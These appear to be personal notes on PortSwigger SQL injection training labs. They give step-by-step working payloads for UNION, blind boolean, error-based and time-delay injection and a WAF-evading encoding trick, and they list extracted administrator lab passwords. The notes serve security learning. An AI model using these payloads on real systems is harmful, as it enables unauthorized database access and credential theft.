# SQLi

---

<img width="625" height="477" alt="image" src="https://github.com/user-attachments/assets/9553f17d-8409-48b3-b7ce-2f1451ba43f6" />


<img width="634" height="209" alt="image" src="https://github.com/user-attachments/assets/4cdfceaf-4423-4e10-809f-f836bf2151d7" />


<img width="632" height="592" alt="image" src="https://github.com/user-attachments/assets/587d28b1-ffc6-4ad9-9962-5a22ba388d54" />

<img width="636" height="462" alt="image" src="https://github.com/user-attachments/assets/e713db29-780a-4d49-8342-8f19771c37e8" />

<img width="555" height="703" alt="image" src="https://github.com/user-attachments/assets/6f466ceb-5331-42fb-bb54-cb0825358df8" />

---
### WARNING

<img width="631" height="170" alt="image" src="https://github.com/user-attachments/assets/59f9b6a1-9bf0-4823-9487-b4739a1082cf" />

---

<img width="641" height="357" alt="image" src="https://github.com/user-attachments/assets/668f13d1-f30b-4235-bf94-676eaa869e79" />

---

<img width="625" height="294" alt="image" src="https://github.com/user-attachments/assets/4cbd0a9f-e8a0-45ea-a8a9-67cecbccbb27" />

---

<img width="646" height="578" alt="image" src="https://github.com/user-attachments/assets/62b0dfe3-bb9c-4f3e-a57f-9e2178e82202" />


//LAB -- SQL injection attack, querying the database type and version on Oracle

<img width="1127" height="339" alt="image" src="https://github.com/user-attachments/assets/93d4f8d0-7339-490f-88e8-b504e5ed097b" />

<img width="1124" height="321" alt="image" src="https://github.com/user-attachments/assets/2c47c70b-0093-49fa-9f0a-d01d85be1460" />

<img width="1128" height="323" alt="image" src="https://github.com/user-attachments/assets/5b12071f-cf0c-4063-99c1-662aee94f018" />

<img width="1124" height="325" alt="image" src="https://github.com/user-attachments/assets/56886850-fb58-4111-8bfc-756b2d2c1452" />

<img width="1127" height="333" alt="image" src="https://github.com/user-attachments/assets/965b3101-ada4-458f-95d8-9daec21a3b9e" />

<img width="1127" height="326" alt="image" src="https://github.com/user-attachments/assets/728c3df7-6c4d-4cd0-bbd2-5cc981799fb0" />


---

//now check `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md#oracle-sql-methodology` for ORACLE sql syntax

- `GET /filter?category='union+select+banner,version+from+v$version--+- HTTP/2` -- this did it

<img width="1127" height="505" alt="image" src="https://github.com/user-attachments/assets/b89c7366-d428-4505-b583-41b326ea115a" />

---

//LAB -- SQL injection attack, querying the database type and version on MySQL and Microsoft


- first add `'` -- returns 500 error
- then add `-- -` -- and it turns back to 200 OK -- so we can control this param
- next try `' union select null, null-- -` -- returns 200 OK

<img width="1120" height="325" alt="image" src="https://github.com/user-attachments/assets/4800d88a-b25f-4d2f-ae15-1f0e8252c947" />

- adding another `null` and we get 500 error -- so there's 2 params

<img width="1122" height="293" alt="image" src="https://github.com/user-attachments/assets/65b68a28-6c6b-4b68-9376-a8410a188d8b" />

- try adding `@@version` in the second param and it works -- lab solved

<img width="1126" height="464" alt="image" src="https://github.com/user-attachments/assets/03a6bcdf-6078-4f21-86eb-795cbcb2d9a4" />




---

<img width="638" height="465" alt="image" src="https://github.com/user-attachments/assets/66ec6564-5757-4609-adea-51d79cd37eda" />

<img width="537" height="788" alt="image" src="https://github.com/user-attachments/assets/ca295f79-a6ff-4277-9a24-66290f3661d5" />

---

//LAB -- SQL injection UNION attack, determining the number of columns returned by the query

- 200 OK for valid param value

<img width="1121" height="323" alt="image" src="https://github.com/user-attachments/assets/456bb5ef-1e18-4fda-955d-dfa3f8fabaa9" />

- `'` breaks it -- we get 500 error

<img width="1125" height="322" alt="image" src="https://github.com/user-attachments/assets/2db39916-c969-482c-9cb2-126228ad51df" />

- `'--+-` adding a comment fixes it

<img width="1131" height="328" alt="image" src="https://github.com/user-attachments/assets/27c1e47c-78d2-4f30-995d-4b6f7baaec3a" />


<img width="1119" height="481" alt="image" src="https://github.com/user-attachments/assets/ed3f1281-f76d-4a84-aef4-229800e5bc5d" />


<img width="1124" height="438" alt="image" src="https://github.com/user-attachments/assets/10205247-df9a-4845-8b7f-a2323ccab8a2" />


<img width="1126" height="414" alt="image" src="https://github.com/user-attachments/assets/4fae7717-f9a9-47ec-82ca-ebe788f99cb5" />


---

//LAB -- SQL injection UNION attack, finding a column containing text


<img width="641" height="671" alt="image" src="https://github.com/user-attachments/assets/18ec5160-fa14-490a-908a-8f7ab07c172b" />


//page loaded normally

<img width="1114" height="457" alt="image" src="https://github.com/user-attachments/assets/c3e2bf87-dfa1-43ee-8606-69470b898417" />

- `'` causes a 500 error -- indicative of sqli

<img width="1119" height="486" alt="image" src="https://github.com/user-attachments/assets/181d6e4d-902a-4676-bc7d-ee9a175215b8" />


- the comment `--+-` fixes it

<img width="1115" height="557" alt="image" src="https://github.com/user-attachments/assets/4d2654a3-2f2f-4de2-a380-832726c61894" />

- try the `union select null` trick
- 3 params causes no error

<img width="1122" height="667" alt="image" src="https://github.com/user-attachments/assets/1eab8fe1-c65b-455d-9ca9-51190406a466" />

- 4 params causes 500 server error
- so there's 3 params

<img width="1117" height="499" alt="image" src="https://github.com/user-attachments/assets/64c3fe2d-a0f3-4807-8c17-19cdf6e5f5e2" />

- now type in the requested string
- try first param and it didnt work
- the second one does -- and finally lab solved

<img width="1120" height="457" alt="image" src="https://github.com/user-attachments/assets/b7b3c403-7eb2-4919-aa19-18ecd48aea36" />

---


<img width="629" height="387" alt="image" src="https://github.com/user-attachments/assets/14c49ee2-9f1a-4ccf-856b-8d624807505a" />

//LAB -- 

- follow the steps above
- first try `'`
- there's 500 error -- so add `-- -`
- we get 200 OK so the comment fixes it -- confirming we can control this param

---

- now try union injection `'union select null,null-- -` with 2 null params -- and get 200OK

<img width="1118" height="337" alt="image" src="https://github.com/user-attachments/assets/f79a4a5c-ee6d-4299-8ccb-83d72d126292" />

- then with 3 param -- we get 500 error
- so there's 2 params

<img width="1122" height="339" alt="image" src="https://github.com/user-attachments/assets/fda7b23e-dcf7-4401-9295-24be2b66d36d" />

- now grab `username` and `password` values from `user` table

<img width="1121" height="478" alt="image" src="https://github.com/user-attachments/assets/50c416aa-a510-45f1-8e17-1a3aa71aefc1" />



- log in with `administrator : cfwcs2k0gsxh503727rz`
- finally lab solved

<img width="1177" height="439" alt="image" src="https://github.com/user-attachments/assets/90f3fa7e-5b9f-4584-a8cd-57eb0e112612" />

---


<img width="636" height="556" alt="image" src="https://github.com/user-attachments/assets/c0ef5c21-e703-433c-a4c3-752c4592fae6" />

//LAB: SQL injection attack, listing the database contents on non-Oracle databases

- again we start with `'` to check for 500 error -- and we got it
- add `-- -` -- and we get 200OK back -- so we can control this param
- try `'union select null,null` -- got 200 OK
- add another `null` and got 500 error -- so 2 params

- now find out table names with `'union select null,table_name from information_schema.tables-- -`

<img width="1121" height="341" alt="image" src="https://github.com/user-attachments/assets/5fd50f88-9fa3-436d-aaaa-4f44033b3ccc" />

- then find out column names with `'union select null,column_name from information_schema.columns WHERE table_name='users_zadosk'-- -'`

<img width="1125" height="392" alt="image" src="https://github.com/user-attachments/assets/78761de9-74a5-43f4-a710-c1f1b548f8cc" />

- now then grab values from username and password columns
- with `'union select username_axdwup,password_zgnvmz from users_zadosk-- -`

<img width="1119" height="364" alt="image" src="https://github.com/user-attachments/assets/cd711c05-aa43-4097-817e-f13d1b1973a8" />

- log in with the creds `administrator : jitveencs2xg29b45bcp`
- and lab solved

<img width="938" height="337" alt="image" src="https://github.com/user-attachments/assets/afd19970-d7c1-4e15-860f-f2a1c2463675" />



---

<img width="634" height="186" alt="image" src="https://github.com/user-attachments/assets/31131a40-bd9c-466d-87a1-e05b01e58d86" />


//LAB: SQL injection attack, listing the database contents on Oracle


- again we first begin with `'` -- and got 500 error
- add `-- -` -- and we got 200 OK back -- so we can control this param
- find out how many columns there are with `'union select null,null from dual-- -` -- and got 200 OK

<img width="1122" height="312" alt="image" src="https://github.com/user-attachments/assets/d78b51ce-eb12-4aa2-a33f-a5a5cadb389d" />


- add another `null` and we got 500 error
- NOTE that for ORACLE syntax we have to include `from dual`

<img width="1125" height="307" alt="image" src="https://github.com/user-attachments/assets/558812dc-b3f2-48df-b6e5-28bc453757db" />


- now look up ORACLE syntax `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md#oracle-sql-methodology`
- find out table_name with `'union select table_name,null from all_tables-- -`

<img width="1121" height="331" alt="image" src="https://github.com/user-attachments/assets/76781e74-6b99-4a81-b9d5-e94f5dcc2dee" />


- now find out columns with `'union select column_name,null from all_tab_columns where table_name='USERS_PSGOIQ'`

<img width="1120" height="466" alt="image" src="https://github.com/user-attachments/assets/20d07fc4-bd82-4642-8d88-96e4e3406601" />


- finally we grab username and password values from the table with `'union select USERNAME_JQLTVL,PASSWORD_IIYNGP from+USERS_PSGOIQ-- -`


<img width="1125" height="350" alt="image" src="https://github.com/user-attachments/assets/08e058e1-f0e7-44fa-b58d-67ed9ef9100d" />


- log in with `administrator : mwx5jp3c7m52y832wx6v`
- and lab solved

<img width="925" height="341" alt="image" src="https://github.com/user-attachments/assets/07dcf036-f595-4831-baa4-cc0f9e137c63" />


---


<img width="632" height="441" alt="image" src="https://github.com/user-attachments/assets/1c06706c-b9da-404d-bd5a-ef659f0077fe" />


//LAB: SQL injection UNION attack, retrieving multiple values in a single column


- again first add `'` -- and got 500 error
- add comment `-- -` -- and we get 200 OK back -- so we can control this param
- now find out number of columns with `'union select null,null` -- get 200OK
- add another `null` and got 500 error -- so there's 2 columns
- now find out table_name that should contain user creds with `'union select null,table_name from information_schema.tables-- -`

<img width="1132" height="331" alt="image" src="https://github.com/user-attachments/assets/8deec7d6-7b71-4b50-be2a-2a917f841279" />

- then find out columns with `'union select null,column_name from information_schema.columns where table_name='users'-- -`

<img width="1122" height="463" alt="image" src="https://github.com/user-attachments/assets/fa756067-c90a-4ce3-92b3-8fe5f4bd96f5" />

- now get the values in username and password columns
- using this command `'union select null,username || ':' || password from users-- -`
- NOTE that we're using only 1 column to return more than 1 value
- using the || to concatenate strings per `https://portswigger.net/web-security/sql-injection/cheat-sheet`

<img width="1125" height="468" alt="image" src="https://github.com/user-attachments/assets/8e2d8c8e-574c-41b2-b00a-f16588c2e3cc" />


- finally simply log in with `administrator:cam1hq3oi2kse5q0ekhl`
- and lab solved

<img width="916" height="332" alt="image" src="https://github.com/user-attachments/assets/bcb9efd9-1c58-41e9-826a-84b1d8aa2ebd" />

---


## BLIND SQLi

---


<img width="630" height="379" alt="image" src="https://github.com/user-attachments/assets/9fa3a3f8-e6dc-4644-adb0-18df5ddd3005" />

---

<img width="559" height="662" alt="image" src="https://github.com/user-attachments/assets/dbf11d6e-b11b-4027-b4d1-0bb916ec471b" />


<img width="543" height="512" alt="image" src="https://github.com/user-attachments/assets/f7ede7b7-0919-47de-ae41-ebd299db78bc" />


//LAB: Blind SQL injection with conditional responses

- in injecting with `'` in `filter` and `session` params but don't work
- then try session`trackingId` param with `'` then commenting out with `--+-` and we get different content-length
- observe and found there's a welcome message in the `true` condition where content length of
- 3738 is false
- 3799 is true
  
<img width="1247" height="298" alt="image" src="https://github.com/user-attachments/assets/352c8f1a-319a-47f7-bb14-a7c55d0702f3" />

<img width="1248" height="280" alt="image" src="https://github.com/user-attachments/assets/b6816217-4f65-4e84-8c6c-c8a0ec30cab7" />


- then in intruder -- try injecting with `' and substring((select password from users where username = 'administrator'),1,1) = s-- -`
- could do `sniper` with one ascii alphanumeric payload `a-z0-9`
- and change the offset at `substring((),<1>,1)` for each character

<img width="1548" height="394" alt="image" src="https://github.com/user-attachments/assets/936f6808-246f-4f1d-8c23-434f8e11b367" />


- or do cluster bomb and set 2 payloads -- one for ascii alphanumeric a-z0-9 and another just plain number 1-25 for offset
- and finally got `v7fujirlhf759hovp17t`
- log in with `administrator : v7fujirlhf759hovp17t` -- and lab solved


<img width="937" height="385" alt="image" src="https://github.com/user-attachments/assets/27c2fbbd-baa0-4665-9c41-9291d0c007dc" />



---

<img width="566" height="778" alt="image" src="https://github.com/user-attachments/assets/f283f9e8-5c15-417f-a1fe-bcdf4d6931ed" />

//LAB: Blind SQL injection with conditional errors


- as always first try injecting with `'` into different params -- and get 500 error in trackingId param
- then try adding `-- -` and also another `'` -- both work -- we get 200OK again
- then try error-based payloads -- try different syntax
- eventually oracle seems to work -- note that we need `||` to concatenate commands
- we get 200OK with this payload `'+||(select+null+from+dual)||'`


<img width="1254" height="302" alt="image" src="https://github.com/user-attachments/assets/da30bd2d-facd-45a7-8fc8-dc49e436fff2" />


- confirm again with this payload `'+||(select+case+when+(1=2)+then+to_char(1/0)+else+null+end+from+dual)||'`

<img width="1253" height="311" alt="image" src="https://github.com/user-attachments/assets/c2cbadb0-f460-4260-a9ad-3fa58ecfb4cc" />

- now change to `(1=1)` and we get 500 error

<img width="1250" height="309" alt="image" src="https://github.com/user-attachments/assets/954a6a3a-eb53-47c5-856c-be2de8a4ea50" />



- 500 error means true
- payload `'+||(select+case+when+length(password)>1+then+to_char(1/0)+else+null+end+from+users+where+username='administrator')||'`
- so this means length of password is more than 1 -- since we got 500 error

<img width="1247" height="329" alt="image" src="https://github.com/user-attachments/assets/d5559420-9831-411c-8205-6201297eb4fd" />


- here we can see there's 20 characters in the password

<img width="1251" height="325" alt="image" src="https://github.com/user-attachments/assets/3fb05068-0804-4cb2-9bb1-98131e59ffdd" />


- now a new payload to brute each char -- apparently the first char is not 'a'
<img width="1253" height="341" alt="image" src="https://github.com/user-attachments/assets/4b327573-d02b-41b7-b2f9-b7effeb0e7cd" />



- send to intruder to brute each char
- 500 error code means `true` == a match
- payload -- `'+||(select+case+when+substr(password,1,1)='a'+then+to_char(1/0)+else+null+end+from+users+where+username='administrator')||'`
- keep changing second value `substr(password,<1>, 1)` for next characters in the password

<img width="1548" height="398" alt="image" src="https://github.com/user-attachments/assets/e6ecd3bc-f8c8-449f-b957-2d0ba43bb9a9" />


- eventually we get -- `2nr6et37x5s8jqrwn5mm`
- log in with `administrator : 2nr6et37x5s8jqrwn5mm`
- and finally lab solved

<img width="887" height="347" alt="image" src="https://github.com/user-attachments/assets/c08a18c6-fe6b-4c2c-b4fd-ccff35adb793" />


---


<img width="563" height="439" alt="image" src="https://github.com/user-attachments/assets/b48c31e1-cbbf-44ce-b9f3-735e97277ace" />



//LAB: Visible error-based SQLi




- `'` got us 500 error

<img width="1241" height="464" alt="image" src="https://github.com/user-attachments/assets/3161476b-656c-45e8-aa57-f0f5dca0e479" />


- `-- -` fixed it to give us 200OK -- so we now have a valid query again
- we then tried adding `' and CAST((select 1)as int)-- -` -- using int here to extract error since the query asks for char
- now we get a new error saying `AND` condition must be boolean
- so we adjusted our payload by adding `1=` -- to be `' and 1=CAST((select 1)as int)-- -`
- then we no longer get the error -- so we got a valid query again
- now try and leak username with `'and 1=CAST((select username from users)as int)-- -` -- and found that new error got truncated
- so then we have to delete something -- and we got rid of the trackingId cookie value to get some space
- resend the request and we got a new error - caused by the response returning more than one row
- so we adjust the payload to `' and 1=CAST((select username from users limit 1)as int)-- -` -- to get the db to return only one row
- this new error leaks `administrator` user -- implying administrator is the first user in the users table
- finally we got leaked admin's password with `' and 1=CAST((select password from users limit 1)as int)-- -`
- `sgvtiguz7jey49p5flnh`

<img width="1244" height="485" alt="image" src="https://github.com/user-attachments/assets/f3f310f0-2b0b-42ff-bfa7-17fae5757bbf" />


- log in with `administrator : sgvtiguz7jey49p5flnh`
- and lab solved

<img width="917" height="424" alt="image" src="https://github.com/user-attachments/assets/fcea0119-c51a-4a14-a1e1-858c54415b0a" />


---



<img width="658" height="604" alt="image" src="https://github.com/user-attachments/assets/06f1070a-16c7-4491-9c3d-070627e8eb7e" />


//LAB: Blind SQLi with time delays




- try different time-based payloads in `https://portswigger.net/web-security/sql-injection/cheat-sheet`

<img width="1247" height="339" alt="image" src="https://github.com/user-attachments/assets/5621f451-313b-4a39-8d7d-a547bfd9b0a1" />

<img width="1237" height="324" alt="image" src="https://github.com/user-attachments/assets/e470eff4-9c64-4a58-a36a-63dcc6d47477" />


- note that simple `'` would NOT return error pages -- only time-based payloads can infer successful injections via time delays
- eventually this works `'+||+pg_sleep(10)--+-`


<img width="1242" height="327" alt="image" src="https://github.com/user-attachments/assets/00789e94-e87d-4540-83c4-a724408de820" />



- and lab solved


<img width="921" height="376" alt="image" src="https://github.com/user-attachments/assets/4e9b4547-dabb-46e3-9c26-454e4a1433c6" />


---



//LAB: Blind SQL injection with time delays and information retrieval


- try different time-based payloads
- and the postgres one works -- `' || pg_sleep(5)-- -`

<img width="1247" height="303" alt="image" src="https://github.com/user-attachments/assets/be9058d2-30da-4230-b506-c3e94871855b" />


- now try different conditional time-based payloads in `https://portswigger.net/web-security/sql-injection/cheat-sheet`
- eventually this one works -- `'%3b select case when (1=1) then pg_sleep(5) else pg_sleep(0) end-- -`
- note that adding `||` wouldn't work -- and we actually need `;`

<img width="1243" height="311" alt="image" src="https://github.com/user-attachments/assets/9c4ca5f5-03f1-4b22-b413-f72b69008985" />

- then change to `1=2` and get no time-delay -- confirming our payload works
- now then we change the query to `'%3b select case when (username='administrator') then pg_sleep(5) else pg_sleep(0) end from users-- -
- and we get a time-delay -- meaning there's an administrator user

<img width="1248" height="311" alt="image" src="https://github.com/user-attachments/assets/9ba961cc-42f7-47b7-8be4-2bd057978028" />

- then change the query to `'; select case when (username='administrator' and length(password)>20) then pg_sleep(5) else pg_sleep(0) end from users-- -`
- and get no time-delay -- likely due to the password length being fewer than 20 chars
- then change the condition to `(username='administrator' and length(password)>19)`
- and we get a time-delay -- meaning the password length is 20

<img width="1250" height="325" alt="image" src="https://github.com/user-attachments/assets/b623455b-e0be-48f2-b228-76545469a245" />


- now then change the query to `'; select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(5) else pg_sleep(0) end from users-- -`

<img width="1246" height="323" alt="image" src="https://github.com/user-attachments/assets/d8d39064-10e9-49bb-8a50-f380d41b7729" />

- send it to intruder to brute each char

<img width="1549" height="400" alt="image" src="https://github.com/user-attachments/assets/50ae0406-3da2-435b-a965-6b0482bf720e" />


- response received for `v` stands out
- verified it in the repeater and yes we get a time-delay -- confirming `v` is our first char

<img width="1141" height="578" alt="image" src="https://github.com/user-attachments/assets/8289c126-ce51-4438-b04b-845c71b29fa3" />

- continue to the next chars by changing the substring() offset value `substring(password,<1>,1)='a'`
- and finally we got `v4yuyvvm0vm1ppn9uh9h`
- log in with `administrator : v4yuyvvm0vm1ppn9uh9h`
- and lab solved

<img width="939" height="387" alt="image" src="https://github.com/user-attachments/assets/d0e12c51-a577-4a60-aa56-36f36e0ae309" />


---

-- NEED BURP PRO FOR BURP COLLAB TO COMPLETE THE 2 REMAINING BLIND SQLi LABS --


--- 


<img width="561" height="531" alt="image" src="https://github.com/user-attachments/assets/98dee4f8-96b7-4324-a9ec-5f1914b3d379" />


<img width="564" height="534" alt="image" src="https://github.com/user-attachments/assets/683a5a65-c15c-44b7-9f09-5febeb68df62" />


<img width="738" height="429" alt="image" src="https://github.com/user-attachments/assets/f2f9500e-02fd-4246-9583-9b327e5ce3d8" />



//LAB:

- stock check API has request body in XML
- in storeId param try adding `+2` and the stock value change -- to another store's stock quantity
- meaning it gets evaled

<img width="1029" height="483" alt="image" src="https://github.com/user-attachments/assets/6b21b643-583c-4be2-a457-7e451b7117fa" />

<img width="999" height="483" alt="image" src="https://github.com/user-attachments/assets/d05922d6-d1c3-4a92-bced-5f1aa66e703b" />


- now try union injection with payload `union select null`
- note that we're not using `'`
- but got blocked by WAF

<img width="1011" height="473" alt="image" src="https://github.com/user-attachments/assets/3f45eb38-b6ba-4921-b794-8dd01813e5bb" />

- now highlight our payload --> right click --> extensions --> hackvertor --> encoding
- try different encoding schemes
- eventually the dec_entities works

<img width="1020" height="506" alt="image" src="https://github.com/user-attachments/assets/90186e1e-d3d6-4dda-8cf8-501968e4d92f" />


- try different payloads but we got nothing returned
- finally got the creds with `union select username || ':' || password from users`
- note that we're not using `'` or comment `-- -`

<img width="969" height="506" alt="image" src="https://github.com/user-attachments/assets/dd359cba-f52e-4e6d-b836-ba3c2c1ef45a" />


- log in with `administrator : mzymxnqdefw33lv308ph`
- and lab solved

<img width="957" height="365" alt="image" src="https://github.com/user-attachments/assets/f3c24e07-efd8-4cbd-984f-75ff9ea8e3d2" />













